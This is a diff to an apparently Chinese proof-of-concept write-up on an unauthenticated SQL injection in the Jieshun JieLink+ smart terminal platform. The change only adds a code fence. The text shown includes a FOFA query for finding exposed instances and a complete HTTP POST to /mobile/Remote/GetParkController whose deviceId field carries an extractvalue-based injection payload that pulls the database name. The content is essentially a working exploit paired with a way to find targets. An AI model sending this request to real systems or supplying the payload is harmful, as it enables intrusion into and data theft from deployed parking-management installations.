@@ -88,6 +88,7 @@ FOFA：title="JieLink+智能终端操作平台"
 
 POC/EXP：
 
+```http
 POST /mobile/Remote/GetParkController HTTP/1.1
 Host: 127.0.0.1:8090
 Content-Length: 66
@@ -104,7 +105,9 @@ Accept-Language: zh-CN,zh;q=0.9
 Cookie: DefaultSystem=JieLink
 Connection: close
 
+
 deviceId=1'and/**/extractvalue(1,concat(char(126),database()))and'
+```
 
 ![image-20231212142139201](./.resource/捷顺jielink智能终端操作平台前台存在通用SQL注入漏洞/media/image-20231212142139201.png)
 
